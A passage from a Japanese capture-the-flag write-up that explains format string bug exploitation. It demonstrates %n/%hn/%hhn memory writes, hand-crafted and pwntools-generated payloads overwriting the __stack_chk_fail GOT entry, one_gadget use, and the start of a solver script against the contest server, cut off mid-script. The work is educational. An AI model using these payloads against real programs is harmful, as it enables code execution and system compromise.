    ptr <span class="token operator">=</span> <span class="token function">va_arg</span><span class="token punctuation">(</span>ap<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>flags <span class="token operator">&amp;</span> LONGLONGFLAG<span class="token punctuation">)</span>
        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span>ptr <span class="token operator">=</span> chars_written<span class="token punctuation">;</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>flags <span class="token operator">&amp;</span> LONGFLAG<span class="token punctuation">)</span>
        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span>ptr <span class="token operator">=</span> chars_written<span class="token punctuation">;</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>flags <span class="token operator">&amp;</span> HALFHALFFLAG<span class="token punctuation">)</span>
        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>ptr <span class="token operator">=</span> chars_written<span class="token punctuation">;</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>flags <span class="token operator">&amp;</span> HALFFLAG<span class="token punctuation">)</span>
        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">short</span> <span class="token operator">*</span><span class="token punctuation">)</span>ptr <span class="token operator">=</span> chars_written<span class="token punctuation">;</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>flags <span class="token operator">&amp;</span> SIZETFLAG<span class="token punctuation">)</span>
        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>ptr <span class="token operator">=</span> chars_written<span class="token punctuation">;</span>
    <span class="token keyword">else</span> 
        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span>ptr <span class="token operator">=</span> chars_written<span class="token punctuation">;</span>
    <span class="token keyword">break</span><span class="token punctuation">;</span></code></pre></div>
<p>参考：<a href="https://android.googlesource.com/kernel/lk/+/9d564f1bd646819a9824c5a55c73521cb4f8fb81/lib/libc/printf.c" target="_blank" rel="nofollow noopener noreferrer">lib/libc/printf.c - kernel/lk - Git at Google</a></p>
<p>実際に以下のようなコードを使って確かめてみると、<code class="language-text">%hhn</code> を使用した場合は buf の下位 1 バイトのみが、<code class="language-text">%hn</code> を使用した場合は下位 2 バイトのみが、そして <code class="language-text">%n</code> を使用する場合はすべての値が書き換えられることを確認できます。</p>
<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// 0xFFF -> 0xFF</span>
    <span class="token keyword">int</span> buf <span class="token operator">=</span> <span class="token number">0x0DDDDDDD</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%4095c%hhn\n"</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%x"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token comment">// 0xFFFFF -> 0xFFFF</span>
    buf <span class="token operator">=</span> <span class="token number">0x0DDDDDDD</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%1048575c%hn\n"</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%x"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token comment">// 0xFFFFFFFF</span>
    buf <span class="token operator">=</span> <span class="token number">0x0DDDDDDD</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%268435455c%n\n"</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%x"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre></div>
<p>また、このコードを実行してみるとわかる通り、最後の <code class="language-text">printf("%268435455c%n\n",NULL,&amp;buf);</code> を実行する際には膨大なサイズの余白が出力されます。</p>
<p>このような操作をリモート端末に対して行うと、数百 MB ~ 数 GB 以上のサイズのデータ通信が発生することになり、ネットワーク負荷やペイロードの送信遅延によって攻撃が失敗する可能性があります。</p>
<p>そのため、FSB の悪用に使用可能な入力サイズの制限などの理由がない限り、メモリの置き換えを行う場合は short や byte サイズでの書き換えを行う方がよいようです。</p>
<p>※ pwntools の fmtstr<em>payload の `write</em>size` はデフォルトで Byte が設定されているようです。</p>
<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">fmtstr_payload</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span> writes<span class="token punctuation">,</span> numbwritten<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> write_size<span class="token operator">=</span><span class="token string">'byte'</span><span class="token punctuation">,</span> write_size_max<span class="token operator">=</span><span class="token string">'long'</span><span class="token punctuation">,</span> overflows<span class="token operator">=</span><span class="token number">16</span><span class="token punctuation">,</span> strategy<span class="token operator">=</span><span class="token string">"small"</span><span class="token punctuation">,</span> badbytes<span class="token operator">=</span><span class="token builtin">frozenset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> offset_bytes<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> no_dollars<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre></div>
<p>それでは実際に、<code class="language-text">__stack_chk_fail</code> の GOT オーバーライドによって、Canary が破壊された場合に go 関数が呼び出されるようにペイロードを作成してみましょう。</p>
<p><code class="language-text">__stack_chk_fail</code> の GOT が指すアドレスは 0x404018 であり、go 関数の呼び出しアドレスは 0x401196 です。</p>
<p>そこで、まずは以下のペイロードを試してみることにします。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">%4198806c%8<span class="token variable">$n</span><span class="token punctuation">\</span>x90<span class="token punctuation">\</span>x90<span class="token punctuation">\</span>x90<span class="token punctuation">\</span>x18@@<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00</code></pre></div>
<p>このペイロードは、<code class="language-text">&lt;0x401196 バイト分の余白> + &lt;第 7 引数のスタックが保持するポインタアドレスに int 値として書き込み> + &lt;スタック調整のパディング> + p64(0x401196) の値</code> で構成されています。</p>
<p>このペイロードをバイナリに送り込むと、実際に <code class="language-text">__stack_chk_fail</code> の GOT が指すアドレスを 0x401196 に改ざんできたことがわかります。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 735px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/c133ccd006ec3ceacbd4ad37b84ff677/7608e/image-20240609200650367.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 130.41666666666666%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAaCAYAAAC3g3x9AAAACXBIWXMAAAsTAAALEwEAmpwYAAAErElEQVRIx21V2XbaSBTUiw1St/Z9Y5FYDAKxCTAYZpxk/v+XakoiyYljP9RpkM3tunVvlRQ58GBlIcpyiWg4gkgdTLwUmRdByx3IxIXMcxiDGCKxMQ4S1P4AYRBCG/DvscvnDvSBD8sLobhOiMP+iKKcYvFSESvolgPb8WGbHpIgQ+Dl8JwYumqir+l4FhIqT6kaENpPtJ+FASVOYlyvF2w2NbbbLbGB49pwycbyTUQvIYxEQPV6ZKJBc1RITUBKASEf559QoijC6+srqqrCer1Gva7heA7SMoO0dHjjAMmELEcR3KGHmKdpmGTTFpAs+hGK73t4e7t2BQ+HA5luEIU+JsUYSRzg7VTj7bzD6qXAdjXHqlrBMHQW1B6sxEcoSTrEfn/AbDZDkiQIwxC6zh9IjadAHGrU06SOAral4ulZhdbqJ8nyEywo63oPL1mib6/Qsyr07DUGozmq9QEvyy2m8w1m1QXTlz2Wqz22+zPSbAxVWJC6A9HBJtzuVL6/35CMGjy7F2jhDWpwx2JR4cf3d/z34xvutyul2OJ6u+B0OiKOo0e7XYvaJyjXyxnRYIuec4LmX6D6r4jiFHmxQz55Q5jkSKWOgm1GjoPReIwszdi29vVQ7rw5Gu7xRIZq8Mb1eEVKXet6g3IyI6O4u9ngP+u65ECMh8bi80C6oYyKBbyw5D/SJfYMml3A4pSjlMtMV+imD1U60DqN3N/nZ/jdqeSjEZI0QWaQgZlAOgMI2kn3AsTJiBO2eZnkAPSuJfkH/m5XUhqlatsbUJcohDAIc4K+WUI1C7Jpbecg4q7qXAmhCmhsS6UEXcv8LrRfYFFaUnEin1ZzkKcl7DCG6prI7RCh7XPqFgfFkAgLiCiD8F2kboyJm8FzGQ4Rg4OXtc8lTWAyFxTJRU6Kstu9dFQiHA8ROgk8j2EQBbBTDiUeQgtYmD9swySyaD9eKAJq5xJeW9hnqHhQ2hh6/+dfTrVG0zRMngaWbcGzbTi6iaEfwGE7xnMfVo8uee6hp33VsuieKRmz7na7dQVbC+52+y4cwpHH+LIwYKsFNU7CBDlRDIaw+Fxo4sNwfn0mQx/fvr13sXVsDiy6Y3i6GI8z7qCL+33JC2vstmNstiXmizl0Q3Zef4TDX06xKXK12jFg55jOKkymSxh0hAwNGD5zcaZDTxm2qQUjFegHJvS8TXF62CSk/dPLD08rTXOCEy3wZLb22+HZ3qFk0aZ5JaMGq9UB682FOJL9mb4+M5UGUNW/E8d6pM31ckI8ZDGXXg4YEP6ZLGddit/vNxyPDarlC4fFTFxVcLjov7Pwqzw8HQ8I87pjp3kN93APnyuSjtZIxkcEUYqEDhhy0rHrIeCaWZZFiUpEUfwpJDqGbdo8OQeyOzIcGraUkVWFcTF5BC5/ZPB2owsHvWNmmkYXFuLDUMiwnC7gRgV9PIBm0XbWrHNMNiwYYzksLrJGwaXhEe5P8RkW7TCk8/u70L1HOAypX5ZukDJpzOjMt12FsDRh0yUBX6G6QfvRo72+1kETLUO+Mr8EwyG2lkisGnnCd8tuil09RplJzIYCWdyH7+qdZvP5DNPppBvKQ7ev8/B/i2CV3E6RVF8AAAAASUVORK5CYII='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/c133ccd006ec3ceacbd4ad37b84ff677/8ac56/image-20240609200650367.webp 240w,
/static/c133ccd006ec3ceacbd4ad37b84ff677/d3be9/image-20240609200650367.webp 480w,
/static/c133ccd006ec3ceacbd4ad37b84ff677/ed0c4/image-20240609200650367.webp 735w"
              sizes="(max-width: 735px) 100vw, 735px"
              type="image/webp"
            />
          <source
            srcset="/static/c133ccd006ec3ceacbd4ad37b84ff677/8ff5a/image-20240609200650367.png 240w,
/static/c133ccd006ec3ceacbd4ad37b84ff677/e85cb/image-20240609200650367.png 480w,
/static/c133ccd006ec3ceacbd4ad37b84ff677/7608e/image-20240609200650367.png 735w"
            sizes="(max-width: 735px) 100vw, 735px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/c133ccd006ec3ceacbd4ad37b84ff677/7608e/image-20240609200650367.png"
            alt="image-20240609200650367"
            title="image-20240609200650367"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>しかし、前述の通りこのペイロードでは 0x404018 バイト分のデータを出力することになります。</p>
<p>そのため、次は Byte や Short 単位でこのメモリアドレスを改ざんするようにペイロードを工夫してみます。</p>
<p>以下の Python スクリプトで生成したペイロードを送り込むと、先ほどと同じように  <code class="language-text">__stack_chk_fail</code> の GOT が指すアドレスを 0x401196 に改ざんできました。</p>
<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python"><span class="token string">b"%17c%12$hhn%47c%13$hhn%86c%11$hhn"</span> <span class="token operator">+</span> <span class="token string">b"\x90"</span><span class="token operator">*</span><span class="token number">7</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x404018</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x404019</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x40401a</span><span class="token punctuation">)</span></code></pre></div>
<p>このペイロードでは、<code class="language-text">%17c%12$hhn</code> で 0x404019 に 0x11 を、<code class="language-text">%47c%13$hhn%</code> で 0x40401a に 0x40 を、<code class="language-text">%86c%11$hhn</code> で  0x404018 に 0x96 を書き込んでいます。</p>
<p><code class="language-text">%n</code> フォーマッタでは、その printf 関数が出力した文字数に応じて書き込む値が変化するため、書き込む値が小さい順から、その差分を取っていく形で書き込み順序と %c で出力する値を決定しています。</p>
<p>そのため、Byte サイズの書き込みを行う場合には、printf 関数が出力するデータ量は 0xFF(+α) 程度に抑えることができます。</p>
<p>また、以下のスクリプトで生成したペイロードでは、<code class="language-text">%hn</code> を使用して Short 単位でメモリアドレスを書き換えることでも、GOT オーバーライドを行うことができます。</p>
<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python"><span class="token string">b"%64c%10$hn%4438c%9$hn"</span> <span class="token operator">+</span> <span class="token string">b"\x90"</span><span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x404018</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x40401a</span><span class="token punctuation">)</span></code></pre></div>
<p>ここでは、<code class="language-text">%64c%10$hn</code> で 0x40401a に 0x0040 を、<code class="language-text">%4438c%9$hn</code> で 0x404018 に 0x1196 を書き込むことでオーバーライドを行っています。</p>
<p>Short 単位で書き込む場合も、Byte の場合と同じく書き込む値が小さい順から、その差分を取っていく形で書き込み順序と %c で出力する値を決定しています。</p>
<p>これで、FSB を悪用した GOT オーバーライドのためのペイロードをハンドメイドできるようになりました。</p>
<p>とはいえ、実際に CTF の問題を解く場合には、もっと簡単にペイロードを作成したいと思います。</p>
<p>そこで、最後に先ほど紹介した pwntools の fmtstr_payload 関数を使います。</p>
<p>fmtstr_payload 関数は以下のデフォルト引数を取るように定義されています。</p>
<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">fmtstr_payload</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span> writes<span class="token punctuation">,</span> numbwritten<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> write_size<span class="token operator">=</span><span class="token string">'byte'</span><span class="token punctuation">,</span> write_size_max<span class="token operator">=</span><span class="token string">'long'</span><span class="token punctuation">,</span> overflows<span class="token operator">=</span><span class="token number">16</span><span class="token punctuation">,</span> strategy<span class="token operator">=</span><span class="token string">"small"</span><span class="token punctuation">,</span> badbytes<span class="token operator">=</span><span class="token builtin">frozenset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> offset_bytes<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> no_dollars<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre></div>
<p>そのため、ユーザは offset(フォーマッタで参照可能な最上位のスタックアドレスの位置) と writes(書き換えたいアドレスと値の組み合わせを定義した辞書) を引数に与えるだけで、簡単に FSB を悪用することができます。</p>
<p>すでに確認している通り、今回のバイナリで FSB を悪用する場合にアクセス可能な最上位のスタックの offset は 6 です。</p>
<p>そして、<code class="language-text">__stack_chk_fail</code> の GOT が指すアドレスは 0x404018 であり、go 関数の呼び出しアドレスは 0x401196 です。</p>
<p>以上の情報から、以下のスクリプトで簡単に GOT オーバーライドのためのペイロードを作成できます。</p>
<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python">fmtstr_payload<span class="token punctuation">(</span>offset<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span> writes<span class="token operator">=</span><span class="token punctuation">{</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"__stack_chk_fail"</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token number">0x401196</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre></div>
<p>このスクリプトを実行すると、以下のペイロードが作成されます。</p>
<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python"><span class="token string">b'%150c%11$lln%123c%12$hhn%47c%13$hhnaaaab\x18@@\x00\x00\x00\x00\x00\x19@@\x00\x00\x00\x00\x00\x1a@@\x00\x00\x00\x00\x00'</span></code></pre></div>
<p>このペイロードでは、最初に <code class="language-text">%150c%11$lln</code> で 0x96 を 0x404018 に書き込んでいます。</p>
<p>fmtstr<em>payload の write</em>size がデフォルトなのに <code class="language-text">%lln</code> を使用しているのは、恐らく 0x96 を long long 型として書き込むことで、対象メモリの他の余計なデータをフラッシュするための工夫だと考えられます。</p>
<p>また、fmtstr_payload で作成したペイロードでは、先ほどハンドメイドしたペイロードのように書き込む値が小さい順に並び替えるようなことはせず、0x404018 から 0x40401a まで、順に 1 バイトずつ書き込みを行っているようです。</p>
<p>これは恐らく、<code class="language-text">%hhn</code> で書き込む際に下位 1 バイト以外は無視できる性質を利用していると考えられます。</p>
<p>そのため、以下のように最初に 0x96 を書き込んだ場合でも、0x111 や 0x140 になるように追加の出力を行うことで、実質的に 0x96、0x11、0x40 を順に書き込むことができるようになっています。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 200px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/8fb00115c182671b6a1a1c6f537de185/772e8/image-20240609222154782.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 60%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAAAsTAAALEwEAmpwYAAACGklEQVQoz22T7VMSURTGV9OytBen+mIKpLwvrCwYLxOMQLC8v61oQIICQ1aGNaPONOP4rf/76ZyTUKgfnrl377377Dm/566StkZQDxgwgzlEX/pQ07Jo7hRh2OO0lpe99vsa+pkWPkYrePfCA21pE4En9nulZDZjOIiURREyLHmTuDwc47Q+RC+1j6P0Ac72RrganGNgtBFeVaE9+me4/Xhr1jC86kVVy6ChG2hQlUOjg6InOT0QeuaGvuwgk7fQVxwI0Fy/0X2mirpoRSfewHn7FJ+LXfw6/omCexdu5Q38ZML7PHeRvPMbUBcs8D7YIFmk0u2lrRlTJWUJo+r/IOJqi2TG7HKOOFWdu2FYxyDbRsWXRplkhgrCc4/GnefuGaYzDKOv/GLADL9WjtFLNoXhmBhejy7lmcP5VuvjpNRDd7cpRUyYcpXCsEYMOeWSmpJQeEzbIvL14FOn8OL2uU19xSlcgzTy/DbPKcOLzncJ5FPClHQTa0HhJwzn/jJUF6xi6plfh2eORExdyhrtr0uV3PqUYYUUe60Jt1asirwzIcnfZshidoyI54yE98xQnip33WXIh37sn0jik3t4h2G1jy/lI3TpeWyOqKuGiC+9MOTquBJOmP+UUeFQuDInZsiwfYs2aTGwbKc1l/DiVuV6PbTJuoTCfQ+yLVwNL+Srw1wHv8+upV024UOTO8bwec7v8Ph/IJMzfwCLtYW+OBfq5wAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/8fb00115c182671b6a1a1c6f537de185/ba381/image-20240609222154782.webp 200w"
              sizes="(max-width: 200px) 100vw, 200px"
              type="image/webp"
            />
          <source
            srcset="/static/8fb00115c182671b6a1a1c6f537de185/772e8/image-20240609222154782.png 200w"
            sizes="(max-width: 200px) 100vw, 200px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/8fb00115c182671b6a1a1c6f537de185/772e8/image-20240609222154782.png"
            alt="image-20240609222154782"
            title="image-20240609222154782"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>このように洗練されたスクリプトが出力するようペイロードを自分で作成したペイロードと比較して見るのも、ツール側の工夫を感じられて学びがあると思います。</p>
<h3 id="解法-1onegadget-で-shell-を取得する" style="position:relative;"><a href="#%E8%A7%A3%E6%B3%95-1onegadget-%E3%81%A7-shell-%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B" aria-label="解法 1onegadget で shell を取得する permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>解法 1：OneGadget で Shell を取得する</h3>
<p>FSB で libc のベースアドレスのリークと GOT オーバーライドに成功したので、この問題の Shell を獲得することができます。</p>
<p>この 2 つのテクニックを使用して Shell を取得するため、詳解セキュリティコンテストでも紹介されている one_gadget を使用して one-gadget RCE を行います。</p>
<p>参考：<a href="https://github.com/david942j/one_gadget" target="_blank" rel="nofollow noopener noreferrer">david942j/one_gadget: The best tool for finding one gadget RCE in libc.so.6</a></p>
<p>まずは、与えられた Dockerfile を使用してビルドしたコンテナから、問題サーバと同じバージョンの libc.so.6 ファイル(<code class="language-text">/srv/usr/lib/x86_64-linux-gnu/libc.so.6</code>)をローカル端末にコピーしておきます。</p>
<p>そして、以下のコマンドを実行して one-gadget RCE のアドレスを特定します。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token comment"># sudo gem install one_gadget</span>
one_gadget ./libc.so.6</code></pre></div>
<p>このコマンドを実行すると、以下のような出力をえることができました。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 778px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/77e651148f506d1ff4b98eec9094a365/20982/image-20240610000108947.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 105.41666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAVCAYAAABG1c6oAAAACXBIWXMAAAsTAAALEwEAmpwYAAAEBklEQVQ4y3WVeY/aVhTFkZLJMmommS2zALbBxhs2eME7tgHbYJZZQlqpitQq3/9LnF4/BrWqJn882Qhx3/3dc86l9bu6wA99ib0aoRyEWA0yrAc5oq6OoKPA60jIuwGSWwfDEx7mSQ/mux5GH/oYfxTZk73TsU4ltGbcCN+nGTZmhJ07QzWYojAd/OHt8GAWCG50hB0Vs46HoheikiOkbQfumQr3E134WYP3RWefmwta0Z2FYKBh0UtR9ahYz8ecTtw2EEkqSjlB2rFRiTGmNw6ygYm87yFv+4iu6b0zwZzzMb2zDwV3VOS5l2PNu8i55ssARTeC91WGfS3AuSKkdyKGbzkYJwKGb3j2PGAS8vs+zPeHETDkSnDwZ1xgawSox9RhP0YxdLF31tgoM7hXA/i3CqKrEdJ7hzpy4V8MWTdNgf8e1qF7qyJSdMLysNMXiDsGfFHESkqZOAGnIBF1VP0EW32GR5prg9l09WrBWkiw7saoeZ/mcpjHgpCtix7GVxy8uwGsDwNSVjggk9JHvNe6bG0lHz/jNd3sYTWKUUkZSjXAk1VhJU/hnEuYXMoICLMRIbkZY0LKvlaMFXTuaT5DHXOa3Te7RsKZCBUJj0aJh2GJUJCRygZquuhpXGHv1ljwwavIhw775MEGmfMw63oMed4JML7kydwm0lsf9o0A6zeRKay/IbUJ/4j8/05by76Nv8IV9naMchhgrRR4Jty9UyMXbQTXOqXEQnhlEvII2b2L+Ov41zO0byUEskoJybDV5sh5BwvDYe+F7CEVTSyUCZbiFNvhnC5bYiklv7ZNLUyx4aco2y6zw6w7QXbnYnzOIe6S924CQuaRdCykdx4pzTPkXxZckbF/OBWeyNhz6qQezLHRcsrxAik/JhNTlq8NeOcaUzq8NOFTdq3TfxfD8TBk/15FOjKwHVVYUm7XSo7n8RJrLUWsKajJzI3CGzUndUPUdoStNadlEdJcDfKue8gyzZl1OKcvsraN2T3hUuBn3OFpXQgIOY0UT+C1aYX1yAWkvnUmwv40wORMow1D2+bLYdscvdl6EiP8ParxrJNl5GZFNXkOaMsEtIEC9kNmboZsHFJDiWmS03jxmJ6jlVo+LdGFZ+FxsiK8DLVJAhmk6sjHbpKjpgXRrLVHs8RazjDXbCZQ3g6YlTKG7BHyy/oqyNQzzkHFRczQTQpKLmHIgaCgFGhBdGUsaJvPqIhzLmJyocE/NwhTfRGKFsq5fij4KIX4aW/wpNNN8gQl+a0QAyy1CAshYshNlt3PClPYPVVhf5QIkWfYw7cv6Tl5QW4GXwQW9uEDdmSVB/obWI8T1L6PbZiRkXcM98EoUPZirCcRvscbMnrGlgUj6keUIId1+A/5D32ZRMQUrgAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/77e651148f506d1ff4b98eec9094a365/8ac56/image-20240610000108947.webp 240w,
/static/77e651148f506d1ff4b98eec9094a365/d3be9/image-20240610000108947.webp 480w,
/static/77e651148f506d1ff4b98eec9094a365/10884/image-20240610000108947.webp 778w"
              sizes="(max-width: 778px) 100vw, 778px"
              type="image/webp"
            />
          <source
            srcset="/static/77e651148f506d1ff4b98eec9094a365/8ff5a/image-20240610000108947.png 240w,
/static/77e651148f506d1ff4b98eec9094a365/e85cb/image-20240610000108947.png 480w,
/static/77e651148f506d1ff4b98eec9094a365/20982/image-20240610000108947.png 778w"
            sizes="(max-width: 778px) 100vw, 778px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/77e651148f506d1ff4b98eec9094a365/20982/image-20240610000108947.png"
            alt="image-20240610000108947"
            title="image-20240610000108947"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>FSB による libc アドレスのリークと GOT オーバーライド、そしてこの OneGadget  を使用して以下の Solver を作成することで Shell を取得できます。</p>
<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token comment"># Set target</span>
TARGET_PATH <span class="token operator">=</span> <span class="token string">"./og"</span>
elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span>TARGET_PATH<span class="token punctuation">)</span>

<span class="token comment"># target = process(TARGET_PATH)</span>
target <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"challs.actf.co"</span><span class="token punctuation">,</span> <span class="token number">31312</span><span class="token punctuation">)</span>

<span class="token comment"># Exploit</span>
<span class="token comment"># First stage</span>
target<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Enter your name: "</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">b"%64c%11$hn%4438c%10$hn%15$p"</span> <span class="token operator">+</span> <span class="token string">b"\x90"</span><span class="token operator">*</span><span class="token number">5</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x404018</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x40401a</span><span class="token punctuation">)</span>
target<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

r <span class="token operator">=</span> target<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Enter your name: "</span><span class="token punctuation">)</span>
l1 <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token string">b"0x7f4dfd768d90\x90\x90\x90\x90\x90\x18@@kill $PPID; Enter your name: "</span><span class="token punctuation">)</span>
l2 <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token string">b"\x90\x90\x90\x90\x90\x18@@kill $PPID; Enter your name: "</span><span class="token punctuation">)</span>
